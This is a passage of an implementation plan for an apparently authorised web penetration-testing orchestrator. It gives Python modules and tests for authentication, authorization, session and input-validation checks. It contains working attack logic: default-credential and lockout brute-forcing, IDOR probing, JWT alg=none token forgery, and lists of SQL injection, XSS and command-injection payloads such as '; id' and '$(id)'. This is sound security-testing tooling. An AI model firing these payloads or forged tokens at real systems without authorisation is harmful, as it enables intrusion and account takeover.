        if not self.should_skip_subcategory("username_enumeration"):
            await self._username_enumeration()
            self.mark_subcategory_complete("username_enumeration")

        if not self.should_skip_subcategory("default_credentials"):
            await self._default_credentials()
            self.mark_subcategory_complete("default_credentials")

        if not self.should_skip_subcategory("lockout_testing"):
            if self.is_attack_allowed("brute_force"):
                await self._lockout_testing()
            else:
                self.logger.info("Brute force testing not allowed by scope, skipping lockout test")
            self.mark_subcategory_complete("lockout_testing")

    async def _username_enumeration(self):
        self.logger.info("Starting username enumeration")
        auth_endpoints = self.state.get("auth_endpoints") or []
        if not auth_endpoints:
            auth_endpoints = await self._discover_auth_endpoints()

        for endpoint in auth_endpoints:
            # Response difference detection
            try:
                resp_likely_valid = self._post_login(endpoint, "admin", "wrong_password_xyz")
                resp_likely_invalid = self._post_login(endpoint, "definitely_not_a_real_user_xyzzy", "wrong")
                result = self._detect_enum_by_diff(resp_likely_valid, resp_likely_invalid)

                if result["enumerable"]:
                    self.evidence.log_potential_exploit("auth_testing", {
                        "type": "username_enumeration",
                        "url": endpoint,
                        "method": result["method"],
                        "severity": "medium",
                        "description": f"Username enumeration possible via {result['method']}",
                    })
                    self.state.enrich("potential_vulnerabilities", [{
                        "type": "username_enumeration",
                        "url": endpoint,
                        "severity": "medium",
                        "description": f"Username enumeration via {result['method']}",
                    }])
            except Exception as e:
                self.logger.debug(f"Username enum test failed for {endpoint}: {e}")

            # Timing-based detection
            try:
                timings_valid = []
                timings_invalid = []
                for _ in range(5):
                    start = time.monotonic()
                    self._post_login(endpoint, "admin", "wrong")
                    timings_valid.append(time.monotonic() - start)

                    start = time.monotonic()
                    self._post_login(endpoint, "nonexistent_user_xyzzy", "wrong")
                    timings_invalid.append(time.monotonic() - start)

                avg_valid = statistics.mean(timings_valid)
                avg_invalid = statistics.mean(timings_invalid)
                if abs(avg_valid - avg_invalid) > 0.3:
                    self.evidence.log_potential_exploit("auth_testing", {
                        "type": "username_enumeration_timing",
                        "url": endpoint,
                        "avg_valid_user_time": avg_valid,
                        "avg_invalid_user_time": avg_invalid,
                        "severity": "medium",
                    })
            except Exception:
                pass

    async def _discover_auth_endpoints(self) -> list[str]:
        live_hosts = self.state.get("live_hosts") or []
        endpoints = self.state.get("endpoints") or []
        auth_paths = ["/login", "/signin", "/auth", "/api/login", "/api/auth",
                      "/account/login", "/user/login", "/admin/login"]
        found = []
        for host in live_hosts:
            base = host.rstrip("/")
            for path in auth_paths:
                try:
                    resp = self._http_get(f"{base}{path}")
                    if resp.status_code in [200, 302, 401, 405]:
                        found.append(f"{base}{path}")
                except Exception:
                    continue
        if found:
            self.state.enrich("auth_endpoints", found)
        return found

    def _detect_enum_by_diff(self, resp_valid_user, resp_invalid_user) -> dict:
        # Response content diff
        diff = diff_responses(resp_valid_user.text, resp_invalid_user.text)
        if not diff["identical"] and diff["similarity"] < 0.95:
            return {"enumerable": True, "method": "response_content"}

        # Status code diff
        if resp_valid_user.status_code != resp_invalid_user.status_code:
            return {"enumerable": True, "method": "status_code"}

        # Response length diff
        if abs(diff["length_diff"]) > 10:
            return {"enumerable": True, "method": "response_length"}

        return {"enumerable": False, "method": None}

    async def _default_credentials(self):
        self.logger.info("Starting default credential testing")
        auth_endpoints = self.state.get("auth_endpoints") or []

        for endpoint in auth_endpoints:
            for username, password in self.DEFAULT_CREDENTIALS:
                try:
                    resp = self._post_login(endpoint, username, password)
                    if self._is_login_success(resp):
                        self.logger.critical(
                            f"DEFAULT CREDENTIALS FOUND: {username}:{password} at {endpoint}"
                        )
                        self.evidence.log_confirmed_exploit("auth_testing", {
                            "type": "default_credentials",
                            "url": endpoint,
                            "username": username,
                            "password": password,
                            "severity": "critical",
                            "description": f"Default credentials {username}:{password} accepted",
                        })
                        self.state.enrich("confirmed_vulnerabilities", [{
                            "type": "default_credentials",
                            "url": endpoint,
                            "severity": "critical",
                            "description": f"Default credentials {username}:{password} accepted",
                            "reproduction_steps": f"1. Navigate to {endpoint}\n2. Enter username: {username}\n3. Enter password: {password}\n4. Submit login form",
                            "impact": "Full account access with default credentials",
                            "mitigation": "Force password change on first login. Remove default accounts.",
                        }])
                        self.state.enrich("valid_usernames", [username])
                        return  # Stop after first success
                except Exception:
                    continue

    async def _lockout_testing(self):
        self.logger.info("Starting lockout testing")
        auth_endpoints = self.state.get("auth_endpoints") or []

        for endpoint in auth_endpoints:
            lockout_detected = False
            captcha_detected = False
            attempts_before_lockout = 0

            for i in range(20):  # Test up to 20 attempts
                try:
                    resp = self._post_login(endpoint, "admin", f"wrong_password_{i}")
                    body_lower = resp.text.lower()

                    if "locked" in body_lower or "too many" in body_lower or resp.status_code == 429:
                        lockout_detected = True
                        attempts_before_lockout = i + 1
                        break
                    if "captcha" in body_lower or "recaptcha" in body_lower:
                        captcha_detected = True
                        attempts_before_lockout = i + 1
                        break
                except Exception:
                    break

            finding = {
                "url": endpoint,
                "lockout_detected": lockout_detected,
                "captcha_detected": captcha_detected,
                "attempts_before_trigger": attempts_before_lockout,
            }

            if not lockout_detected and not captcha_detected:
                finding["severity"] = "medium"
                finding["type"] = "weak_lockout"
                finding["description"] = "No account lockout or rate limiting detected after 20 failed attempts"
                self.state.enrich("potential_vulnerabilities", [finding])
                self.evidence.log_potential_exploit("auth_testing", finding)
            else:
                self.evidence.log_parsed("auth_testing", "lockout_results", finding)

    def _post_login(self, url: str, username: str, password: str):
        from wstg_orchestrator.utils.http_utils import HttpClient
        client = HttpClient(
            scope_checker=self.scope,
            rate_limiter=self.rate_limiter,
            custom_headers=self.config.custom_headers if hasattr(self.config, 'custom_headers') else {},
        )
        return client.post(url, data={"username": username, "password": password})

    def _http_get(self, url: str):
        from wstg_orchestrator.utils.http_utils import HttpClient
        client = HttpClient(
            scope_checker=self.scope,
            rate_limiter=self.rate_limiter,
            custom_headers=self.config.custom_headers if hasattr(self.config, 'custom_headers') else {},
        )
        return client.get(url)

    def _is_login_success(self, resp) -> bool:
        if resp.status_code in [302, 303] and "location" in {k.lower() for k in resp.headers}:
            location = resp.headers.get("Location", resp.headers.get("location", ""))
            if "dashboard" in location or "home" in location or "welcome" in location:
                return True
        if resp.status_code == 200:
            body_lower = resp.text.lower()
            success_indicators = ["welcome", "dashboard", "logout", "my account", "profile"]
            failure_indicators = ["invalid", "incorrect", "failed", "error", "wrong"]
            if any(s in body_lower for s in success_indicators) and \
               not any(f in body_lower for f in failure_indicators):
                return True
        return False
```

**Step 4: Run tests**

```bash
pytest tests/test_auth_testing.py -v
```

Expected: All PASS

**Step 5: Commit**

```bash
git add wstg_orchestrator/modules/auth_testing.py tests/test_auth_testing.py
git commit -m "feat: implement AuthTestingModule with username enum, default creds, and lockout detection"
```

---

## Task 17: Authorization Testing Module

**Files:**
- Create: `wstg_orchestrator/modules/authorization_testing.py`
- Create: `tests/test_authorization_testing.py`

**Step 1: Write failing tests**

```python
# tests/test_authorization_testing.py
import pytest
from unittest.mock import MagicMock
from wstg_orchestrator.modules.authorization_testing import AuthorizationTestingModule


@pytest.fixture
def authz_module():
    state = MagicMock()
    state.get.side_effect = lambda key: {
        "live_hosts": ["https://app.example.com"],
        "potential_idor_candidates": [
            {"url": "https://app.example.com/user/123", "type": "numeric", "value": "123"},
        ],
        "endpoints": ["https://app.example.com/api/profile"],
        "parameters": [],
    }.get(key, [])
    state.is_phase_complete.return_value = False
    state.is_subcategory_complete.return_value = False
    config = MagicMock()
    config.base_domain = "example.com"
    config.get_tool_config.return_value = {}
    config.custom_headers = {}
    config.get_auth_profile.return_value = None
    scope = MagicMock()
    scope.is_in_scope.return_value = True
    limiter = MagicMock()
    evidence = MagicMock()
    evidence.log_parsed.return_value = "/tmp/test"
    evidence.log_potential_exploit.return_value = "/tmp/test"
    evidence.log_confirmed_exploit.return_value = "/tmp/test"
    callback = MagicMock()
    return AuthorizationTestingModule(state, config, scope, limiter, evidence, callback)


def test_phase_name(authz_module):
    assert authz_module.PHASE_NAME == "authorization_testing"


def test_subcategories(authz_module):
    assert "idor_testing" in authz_module.SUBCATEGORIES
    assert "privilege_escalation" in authz_module.SUBCATEGORIES
    assert "jwt_testing" in authz_module.SUBCATEGORIES


def test_generate_idor_candidates(authz_module):
    candidates = authz_module._generate_numeric_idor_values("123")
    assert 122 in candidates
    assert 124 in candidates
    assert 1 in candidates


def test_decode_jwt(authz_module):
    # HS256 JWT with {"sub":"1234567890","name":"Test","iat":1516239022}
    token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IlRlc3QiLCJpYXQiOjE1MTYyMzkwMjJ9.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
    result = authz_module._decode_jwt(token)
    assert result is not None
    assert result["header"]["alg"] == "HS256"
    assert result["payload"]["name"] == "Test"
```

**Step 2: Run tests to verify they fail**

```bash
pytest tests/test_authorization_testing.py -v
```

**Step 3: Implement AuthorizationTestingModule**

```python
# wstg_orchestrator/modules/authorization_testing.py
import base64
import json
import re

from wstg_orchestrator.modules.base_module import BaseModule
from wstg_orchestrator.utils.parser_utils import diff_responses


class AuthorizationTestingModule(BaseModule):
    PHASE_NAME = "authorization_testing"
    SUBCATEGORIES = ["idor_testing", "privilege_escalation", "jwt_testing"]
    EVIDENCE_SUBDIRS = [
        "tool_output", "raw_requests", "raw_responses", "parsed",
        "evidence", "potential_exploits", "confirmed_exploits", "screenshots",
    ]

    async def execute(self):
        if not self.should_skip_subcategory("idor_testing"):
            await self._idor_testing()
            self.mark_subcategory_complete("idor_testing")

        if not self.should_skip_subcategory("privilege_escalation"):
            await self._privilege_escalation()
            self.mark_subcategory_complete("privilege_escalation")

        if not self.should_skip_subcategory("jwt_testing"):
            await self._jwt_testing()
            self.mark_subcategory_complete("jwt_testing")

    async def _idor_testing(self):
        self.logger.info("Starting IDOR testing")
        candidates = self.state.get("potential_idor_candidates") or []

        for candidate in candidates:
            if candidate["type"] == "numeric":
                await self._test_numeric_idor(candidate)
            elif candidate["type"] == "uuid":
                self.logger.info(f"UUID IDOR candidate detected: {candidate['url']} (manual review recommended)")
                self.evidence.log_parsed("authorization_testing", "uuid_idor_candidate", candidate)

    async def _test_numeric_idor(self, candidate: dict):
        url = candidate["url"]
        original_id = candidate["value"]
        test_ids = self._generate_numeric_idor_values(original_id)

        try:
            original_resp = self._http_get(url)
        except Exception:
            return

        for test_id in test_ids:
            test_url = url.replace(f"/{original_id}", f"/{test_id}")
            try:
                test_resp = self._http_get(test_url)
                if test_resp.status_code == 200:
                    diff = diff_responses(original_resp.text, test_resp.text)
                    if not diff["identical"] and diff["similarity"] > 0.3:
                        self.evidence.log_potential_exploit("authorization_testing", {
                            "type": "idor",
                            "original_url": url,
                            "test_url": test_url,
                            "original_id": original_id,
                            "test_id": test_id,
                            "severity": "high",
                            "response_similarity": diff["similarity"],
                        })
                        self.state.enrich("potential_vulnerabilities", [{
                            "type": "idor",
                            "url": test_url,
                            "severity": "high",
                            "description": f"Potential IDOR: changing ID from {original_id} to {test_id} returned different data",
                        }])
            except Exception:
                continue

    def _generate_numeric_idor_values(self, original: str) -> list[int]:
        val = int(original)
        candidates = [val - 1, val + 1, val - 2, val + 2, 1, 0]
        return [c for c in candidates if c >= 0 and c != val]

    async def _privilege_escalation(self):
        self.logger.info("Starting privilege escalation testing")
        endpoints = self.state.get("endpoints") or []
        params = self.state.get("parameters") or []

        # Hidden field tampering - look for role/admin parameters
        role_params = [p for p in params if p.get("name", "").lower() in
                       ["role", "admin", "is_admin", "isadmin", "user_role",
                        "privilege", "level", "access_level", "group"]]

        for param in role_params:
            url = param.get("url", "")
            name = param.get("name", "")
            for tamper_value in ["admin", "1", "true", "root", "superadmin"]:
                try:
                    resp = self._http_post(url, data={name: tamper_value})
                    if resp.status_code == 200:
                        body_lower = resp.text.lower()
                        if any(ind in body_lower for ind in ["admin", "dashboard", "manage", "settings"]):
                            self.evidence.log_potential_exploit("authorization_testing", {
                                "type": "privilege_escalation",
                                "url": url,
                                "parameter": name,
                                "tampered_value": tamper_value,
                                "severity": "critical",
                            })
                            self.state.enrich("potential_vulnerabilities", [{
                                "type": "privilege_escalation",
                                "url": url,
                                "severity": "critical",
                                "description": f"Potential privilege escalation via {name}={tamper_value}",
                            }])
                except Exception:
                    continue

    async def _jwt_testing(self):
        self.logger.info("Starting JWT testing")
        # Look for JWTs in responses from auth endpoints
        auth_endpoints = self.state.get("auth_endpoints") or []
        live_hosts = self.state.get("live_hosts") or []

        jwt_pattern = re.compile(r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+')

        for url in auth_endpoints + live_hosts:
            try:
                resp = self._http_get(url)
                # Check response body and headers for JWTs
                all_text = resp.text + str(resp.headers)
                tokens = jwt_pattern.findall(all_text)

                for token in tokens:
                    decoded = self._decode_jwt(token)
                    if decoded:
                        self.evidence.log_parsed("authorization_testing", "jwt_decoded", {
                            "url": url, "header": decoded["header"],
                            "payload": decoded["payload"],
                        })

                        # Test algorithm=none
                        if decoded["header"].get("alg") != "none":
                            none_token = self._craft_none_jwt(decoded["payload"])
                            try:
                                none_resp = self._http_get(url, extra_headers={
                                    "Authorization": f"Bearer {none_token}"
                                })
                                if none_resp.status_code == 200:
                                    self.evidence.log_confirmed_exploit("authorization_testing", {
                                        "type": "jwt_alg_none",
                                        "url": url,
                                        "severity": "critical",
                                        "description": "JWT accepts algorithm=none, signature validation bypassed",
                                    })
                                    self.state.enrich("confirmed_vulnerabilities", [{
                                        "type": "jwt_alg_none",
                                        "url": url,
                                        "severity": "critical",
                                        "description": "JWT accepts algorithm=none",
                                        "reproduction_steps": "1. Decode JWT\n2. Set header alg to 'none'\n3. Remove signature\n4. Send modified token",
                                        "impact": "Complete authentication bypass",
                                        "mitigation": "Validate JWT algorithm server-side. Reject 'none' algorithm.",
                                    }])
                            except Exception:
                                pass
            except Exception:
                continue

    def _decode_jwt(self, token: str) -> dict | None:
        try:
            parts = token.split(".")
            if len(parts) != 3:
                return None

            def decode_part(part: str) -> dict:
                padding = 4 - len(part) % 4
                part += "=" * padding
                decoded = base64.urlsafe_b64decode(part)
                return json.loads(decoded)

            return {
                "header": decode_part(parts[0]),
                "payload": decode_part(parts[1]),
                "signature": parts[2],
            }
        except Exception:
            return None

    def _craft_none_jwt(self, payload: dict) -> str:
        header = base64.urlsafe_b64encode(
            json.dumps({"alg": "none", "typ": "JWT"}).encode()
        ).rstrip(b"=").decode()
        payload_b64 = base64.urlsafe_b64encode(
            json.dumps(payload).encode()
        ).rstrip(b"=").decode()
        return f"{header}.{payload_b64}."

    def _http_get(self, url: str, extra_headers: dict | None = None):
        from wstg_orchestrator.utils.http_utils import HttpClient
        client = HttpClient(
            scope_checker=self.scope,
            rate_limiter=self.rate_limiter,
            custom_headers=self.config.custom_headers if hasattr(self.config, 'custom_headers') else {},
        )
        return client.get(url, headers=extra_headers)

    def _http_post(self, url: str, data: dict | None = None):
        from wstg_orchestrator.utils.http_utils import HttpClient
        client = HttpClient(
            scope_checker=self.scope,
            rate_limiter=self.rate_limiter,
            custom_headers=self.config.custom_headers if hasattr(self.config, 'custom_headers') else {},
        )
        return client.post(url, data=data)
```

**Step 4: Run tests**

```bash
pytest tests/test_authorization_testing.py -v
```

Expected: All PASS

**Step 5: Commit**

```bash
git add wstg_orchestrator/modules/authorization_testing.py tests/test_authorization_testing.py
git commit -m "feat: implement AuthorizationTestingModule with IDOR, priv esc, and JWT testing"
```

---

## Task 18: Session Testing Module

**Files:**
- Create: `wstg_orchestrator/modules/session_testing.py`
- Create: `tests/test_session_testing.py`

**Step 1: Write failing tests**

```python
# tests/test_session_testing.py
import pytest
from unittest.mock import MagicMock
from wstg_orchestrator.modules.session_testing import SessionTestingModule


@pytest.fixture
def session_module():
    state = MagicMock()
    state.get.side_effect = lambda key: {
        "live_hosts": ["https://app.example.com"],
        "auth_endpoints": ["https://app.example.com/login"],
    }.get(key, [])
    state.is_phase_complete.return_value = False
    state.is_subcategory_complete.return_value = False
    config = MagicMock()
    config.base_domain = "example.com"
    config.get_tool_config.return_value = {}
    config.custom_headers = {}
    config.get_auth_profile.return_value = None
    scope = MagicMock()
    scope.is_in_scope.return_value = True
    limiter = MagicMock()
    evidence = MagicMock()
    evidence.log_parsed.return_value = "/tmp/test"
    evidence.log_potential_exploit.return_value = "/tmp/test"
    callback = MagicMock()
    return SessionTestingModule(state, config, scope, limiter, evidence, callback)


def test_phase_name(session_module):
    assert session_module.PHASE_NAME == "session_testing"


def test_subcategories(session_module):
    assert "cookie_flags" in session_module.SUBCATEGORIES
    assert "session_fixation" in session_module.SUBCATEGORIES
    assert "session_lifecycle" in session_module.SUBCATEGORIES


def test_analyze_cookie_flags(session_module):
    cookie_header = "session=abc123; Path=/; HttpOnly"
    result = session_module._analyze_cookie_flags("session", cookie_header)
    assert result["httponly"] is True
    assert result["secure"] is False
    assert result["samesite"] is None


def test_analyze_cookie_flags_all_set(session_module):
    cookie_header = "session=abc123; Path=/; HttpOnly; Secure; SameSite=Strict"
    result = session_module._analyze_cookie_flags("session", cookie_header)
    assert result["httponly"] is True
    assert result["secure"] is True
    assert result["samesite"] == "Strict"
```

**Step 2: Run tests to verify they fail**

```bash
pytest tests/test_session_testing.py -v
```

**Step 3: Implement SessionTestingModule**

```python
# wstg_orchestrator/modules/session_testing.py
import re

from wstg_orchestrator.modules.base_module import BaseModule


class SessionTestingModule(BaseModule):
    PHASE_NAME = "session_testing"
    SUBCATEGORIES = ["cookie_flags", "session_fixation", "session_lifecycle"]
    EVIDENCE_SUBDIRS = [
        "tool_output", "raw_requests", "raw_responses", "parsed",
        "evidence", "potential_exploits", "confirmed_exploits", "screenshots",
    ]

    async def execute(self):
        if not self.should_skip_subcategory("cookie_flags"):
            await self._cookie_flags()
            self.mark_subcategory_complete("cookie_flags")

        if not self.should_skip_subcategory("session_fixation"):
            await self._session_fixation()
            self.mark_subcategory_complete("session_fixation")

        if not self.should_skip_subcategory("session_lifecycle"):
            await self._session_lifecycle()
            self.mark_subcategory_complete("session_lifecycle")

    async def _cookie_flags(self):
        self.logger.info("Starting cookie flag analysis")
        live_hosts = self.state.get("live_hosts") or []

        for host_url in live_hosts:
            try:
                resp = self._http_get(host_url)
                set_cookies = []
                for key, value in resp.headers.items():
                    if key.lower() == "set-cookie":
                        set_cookies.append(value)

                # Also check if headers is a dict with combined cookies
                if not set_cookies and "Set-Cookie" in resp.headers:
                    set_cookies = [resp.headers["Set-Cookie"]]

                for cookie_str in set_cookies:
                    name_match = re.match(r'([^=]+)=', cookie_str)
                    if not name_match:
                        continue
                    name = name_match.group(1).strip()
                    analysis = self._analyze_cookie_flags(name, cookie_str)
                    analysis["url"] = host_url

                    issues = []
                    if not analysis["httponly"]:
                        issues.append("Missing HttpOnly flag")
                    if not analysis["secure"] and host_url.startswith("https"):
                        issues.append("Missing Secure flag")
                    if analysis["samesite"] is None:
                        issues.append("Missing SameSite attribute")

                    if issues:
                        finding = {
                            "type": "insecure_cookie",
                            "url": host_url,
                            "cookie_name": name,
                            "issues": issues,
                            "severity": "low",
                            "description": f"Cookie '{name}' missing flags: {', '.join(issues)}",
                        }
                        self.state.enrich("potential_vulnerabilities", [finding])
                        self.evidence.log_potential_exploit("session_testing", finding)

                    self.evidence.log_parsed("session_testing", f"cookie_{name}", analysis)
            except Exception as e:
                self.logger.debug(f"Cookie analysis failed for {host_url}: {e}")

    def _analyze_cookie_flags(self, name: str, cookie_str: str) -> dict:
        cookie_lower = cookie_str.lower()
        samesite = None
        samesite_match = re.search(r'samesite=(\w+)', cookie_lower)
        if samesite_match:
            samesite = samesite_match.group(1).capitalize()

        return {
            "name": name,
            "httponly": "httponly" in cookie_lower,
            "secure": "secure" in cookie_lower.split(";")
                      or any("secure" == part.strip() for part in cookie_lower.split(";")),
            "samesite": samesite,
            "path": self._extract_attr(cookie_str, "path"),
            "domain": self._extract_attr(cookie_str, "domain"),
        }

    def _extract_attr(self, cookie_str: str, attr: str) -> str | None:
        match = re.search(rf'{attr}=([^;]+)', cookie_str, re.I)
        return match.group(1).strip() if match else None

    async def _session_fixation(self):
        self.logger.info("Starting session fixation testing")
        auth_endpoints = self.state.get("auth_endpoints") or []

        for endpoint in auth_endpoints:
            try:
                # Get a session cookie before login
                pre_resp = self._http_get(endpoint)
                pre_cookies = self._extract_session_cookies(pre_resp)

                if not pre_cookies:
                    continue

                # Attempt login (with test credentials)
                post_resp = self._http_post(endpoint, data={
                    "username": "test_fixation_check", "password": "test_fixation_check"
                })
                post_cookies = self._extract_session_cookies(post_resp)

                # Check if session ID changed after login attempt
                for cookie_name in pre_cookies:
                    if cookie_name in post_cookies:
                        if pre_cookies[cookie_name] == post_cookies[cookie_name]:
                            self.evidence.log_potential_exploit("session_testing", {
                                "type": "session_fixation",
                                "url": endpoint,
                                "cookie_name": cookie_name,
                                "severity": "high",
                                "description": "Session ID not rotated after login attempt",
                            })
                            self.state.enrich("potential_vulnerabilities", [{
                                "type": "session_fixation",
                                "url": endpoint,
                                "severity": "high",
                                "description": f"Session cookie '{cookie_name}' not rotated on login",
                            }])
            except Exception as e:
                self.logger.debug(f"Session fixation test failed for {endpoint}: {e}")

    async def _session_lifecycle(self):
        self.logger.info("Starting session lifecycle testing")
        # This requires authenticated session - check for auth profile
        auth_profile = self.config.get_auth_profile("default") if hasattr(self.config, 'get_auth_profile') else None

        if not auth_profile:
            self.logger.info("No auth profile configured, skipping session lifecycle tests")
            return

        # TODO: Test session invalidation on logout
        # TODO: Test session reuse after logout
        # TODO: Test session timeout
        self.logger.info("Session lifecycle tests require authenticated session (TODO: implement with auth profile)")

    def _extract_session_cookies(self, resp) -> dict:
        cookies = {}
        session_names = ["session", "sessionid", "phpsessid", "jsessionid",
                         "sid", "sess", "token", "auth", "connect.sid"]
        headers = resp.headers if hasattr(resp, 'headers') else {}
        for key, value in headers.items():
            if key.lower() == "set-cookie":
                name_match = re.match(r'([^=]+)=([^;]+)', value)
                if name_match:
                    name = name_match.group(1).strip().lower()
                    val = name_match.group(2).strip()
                    if any(sn in name for sn in session_names):
                        cookies[name_match.group(1).strip()] = val
        return cookies

    def _http_get(self, url: str):
        from wstg_orchestrator.utils.http_utils import HttpClient
        client = HttpClient(
            scope_checker=self.scope,
            rate_limiter=self.rate_limiter,
            custom_headers=self.config.custom_headers if hasattr(self.config, 'custom_headers') else {},
        )
        return client.get(url)

    def _http_post(self, url: str, data: dict | None = None):
        from wstg_orchestrator.utils.http_utils import HttpClient
        client = HttpClient(
            scope_checker=self.scope,
            rate_limiter=self.rate_limiter,
            custom_headers=self.config.custom_headers if hasattr(self.config, 'custom_headers') else {},
        )
        return client.post(url, data=data)
```

**Step 4: Run tests**

```bash
pytest tests/test_session_testing.py -v
```

Expected: All PASS

**Step 5: Commit**

```bash
git add wstg_orchestrator/modules/session_testing.py tests/test_session_testing.py
git commit -m "feat: implement SessionTestingModule with cookie flags, fixation, and lifecycle tests"
```

---

## Task 19: Input Validation Module

**Files:**
- Create: `wstg_orchestrator/modules/input_validation.py`
- Create: `tests/test_input_validation.py`

**Step 1: Write failing tests**

```python
# tests/test_input_validation.py
import pytest
from unittest.mock import MagicMock
from wstg_orchestrator.modules.input_validation import InputValidationModule


@pytest.fixture
def iv_module():
    state = MagicMock()
    state.get.side_effect = lambda key: {
        "parameters": [
            {"url": "https://app.example.com/search", "name": "q", "value": "test", "method": "GET"},
            {"url": "https://app.example.com/api/users", "name": "id", "value": "1", "method": "GET"},
        ],
        "live_hosts": ["https://app.example.com"],
    }.get(key, [])
    state.is_phase_complete.return_value = False
    state.is_subcategory_complete.return_value = False
    config = MagicMock()
    config.base_domain = "example.com"
    config.get_tool_config.return_value = {}
    config.custom_headers = {}
    scope = MagicMock()
    scope.is_in_scope.return_value = True
    scope.is_attack_vector_allowed.return_value = True
    limiter = MagicMock()
    evidence = MagicMock()
    evidence.log_parsed.return_value = "/tmp/test"
    evidence.log_potential_exploit.return_value = "/tmp/test"
    evidence.log_confirmed_exploit.return_value = "/tmp/test"
    callback = MagicMock()
    callback.generate_callback.return_value = ("http://127.0.0.1:8443/abc123", "abc123")
    return InputValidationModule(state, config, scope, limiter, evidence, callback)


def test_phase_name(iv_module):
    assert iv_module.PHASE_NAME == "input_validation"


def test_subcategories(iv_module):
    assert "sqli_testing" in iv_module.SUBCATEGORIES
    assert "xss_testing" in iv_module.SUBCATEGORIES
    assert "command_injection" in iv_module.SUBCATEGORIES


def test_sqli_payloads_exist(iv_module):
    assert len(iv_module.SQLI_ERROR_PAYLOADS) > 0
    assert "'" in iv_module.SQLI_ERROR_PAYLOADS


def test_xss_payloads_exist(iv_module):
    assert len(iv_module.XSS_PAYLOADS) > 0
    assert any("<script>" in p.lower() or "onerror" in p.lower() for p in iv_module.XSS_PAYLOADS)


def test_cmdi_payloads_exist(iv_module):
    assert len(iv_module.CMDI_PAYLOADS) > 0
```

**Step 2: Run tests to verify they fail**

```bash
pytest tests/test_input_validation.py -v
```

**Step 3: Implement InputValidationModule**

```python
# wstg_orchestrator/modules/input_validation.py
import re
import time
from urllib.parse import urlencode, urlparse, parse_qs, urlunparse

from wstg_orchestrator.modules.base_module import BaseModule
from wstg_orchestrator.utils.command_runner import CommandRunner


class InputValidationModule(BaseModule):
    PHASE_NAME = "input_validation"
    SUBCATEGORIES = ["sqli_testing", "xss_testing", "command_injection"]
    EVIDENCE_SUBDIRS = [
        "tool_output", "raw_requests", "raw_responses", "parsed",
        "evidence", "potential_exploits", "confirmed_exploits", "screenshots",
    ]

    SQLI_ERROR_PAYLOADS = [
        "'", "\"", "' OR '1'='1", "\" OR \"1\"=\"1", "1' OR '1'='1'--",
        "' UNION SELECT NULL--", "1; SELECT 1--", "' AND 1=1--",
        "' AND 1=2--", "admin'--",
    ]

    SQLI_TIME_PAYLOADS = [
        "' OR SLEEP(3)--", "'; WAITFOR DELAY '0:0:3'--",
        "' OR pg_sleep(3)--", "1' AND SLEEP(3)--",
    ]

    SQLI_ERROR_SIGNATURES = [
        r"SQL syntax.*MySQL", r"Warning.*mysql_", r"MySqlException",
        r"valid MySQL result", r"pg_query\(\)", r"PostgreSQL.*ERROR",
        r"ORA-\d{5}", r"Oracle.*Driver", r"Microsoft.*SQL.*Server",
        r"ODBC SQL Server Driver", r"SQLite.*error", r"sqlite3\.OperationalError",
        r"Unclosed quotation mark", r"quoted string not properly terminated",
    ]

    XSS_PAYLOADS = [
        '<script>alert(1)</script>',
        '"><script>alert(1)</script>',
        "'-alert(1)-'",
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        '"><img src=x onerror=alert(1)>',
        "javascript:alert(1)",
        '<body onload=alert(1)>',
        # WAF bypass variants
        '<ScRiPt>alert(1)</ScRiPt>',
        '<img src=x oNeRrOr=alert(1)>',
        '&#60;script&#62;alert(1)&#60;/script&#62;',
        '<svg/onload=alert(1)>',
    ]

    CMDI_PAYLOADS = [
        "; id", "| id", "|| id", "&& id", "`id`", "$(id)",
        "; whoami", "| whoami", "& whoami",
    ]

    CMDI_TIME_PAYLOADS = [
        "; sleep 3", "| sleep 3", "|| sleep 3", "&& sleep 3",
        "; ping -c 3 127.0.0.1", "| ping -c 3 127.0.0.1",
    ]

    CMDI_SIGNATURES = [
        r"uid=\d+\(", r"root:", r"www-data", r"nobody",
    ]

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self._cmd = CommandRunner(
            tool_configs={
                name: self.config.get_tool_config(name)
                for name in ["sqlmap", "commix"]
            }
        )

    async def execute(self):
        if not self.should_skip_subcategory("sqli_testing"):
            await self._sqli_testing()
            self.mark_subcategory_complete("sqli_testing")

        if not self.should_skip_subcategory("xss_testing"):
            await self._xss_testing()
            self.mark_subcategory_complete("xss_testing")

        if not self.should_skip_subcategory("command_injection"):
            await self._command_injection()
            self.mark_subcategory_complete("command_injection")

    async def _sqli_testing(self):
        self.logger.info("Starting SQL injection testing")
        parameters = self.state.get("parameters") or []

        for param in parameters:
            url = param.get("url", "")
            name = param.get("name", "")
            method = param.get("method", "GET")

            # Error-based probes
            for payload in self.SQLI_ERROR_PAYLOADS:
                try:
                    resp = self._inject_param(url, name, payload, method)
                    for sig in self.SQLI_ERROR_SIGNATURES:
                        if re.search(sig, resp.text, re.I):
                            self.evidence.log_potential_exploit("input_validation", {
                                "type": "sqli_error_based",
                                "url": url, "parameter": name,
                                "payload": payload, "signature": sig,
                                "severity": "critical",
                            })
                            self.state.enrich("potential_vulnerabilities", [{
                                "type": "sqli",
                                "url": url,
                                "severity": "critical",
                                "description": f"Error-based SQLi in param '{name}' with payload: {payload}",
                            }])
                            # Hand off to sqlmap for confirmation
                            await self._run_sqlmap(url, name, method)
                            break
                except Exception:
                    continue

            # Time-based probes
            for payload in self.SQLI_TIME_PAYLOADS:
                try:
                    start = time.monotonic()
                    resp = self._inject_param(url, name, payload, method)
                    elapsed = time.monotonic() - start
                    if elapsed >= 2.5:
                        self.evidence.log_potential_exploit("input_validation", {
                            "type": "sqli_time_based",
                            "url": url, "parameter": name,
                            "payload": payload, "delay": elapsed,
                            "severity": "critical",
                        })
                        self.state.enrich("potential_vulnerabilities", [{
                            "type": "sqli_time_based",
                            "url": url,
                            "severity": "critical",
                            "description": f"Time-based SQLi in param '{name}' (delay: {elapsed:.1f}s)",
                        }])
                        await self._run_sqlmap(url, name, method)
                        break
                except Exception:
                    continue

    async def _run_sqlmap(self, url: str, param: str, method: str):
        if not self._cmd.is_tool_available("sqlmap"):
            self.logger.warning("sqlmap not found, skipping automated exploitation")
            return

        args = ["-u", f"{url}?{param}=test" if method == "GET" else url,
                "-p", param, "--batch", "--level=2", "--risk=1",
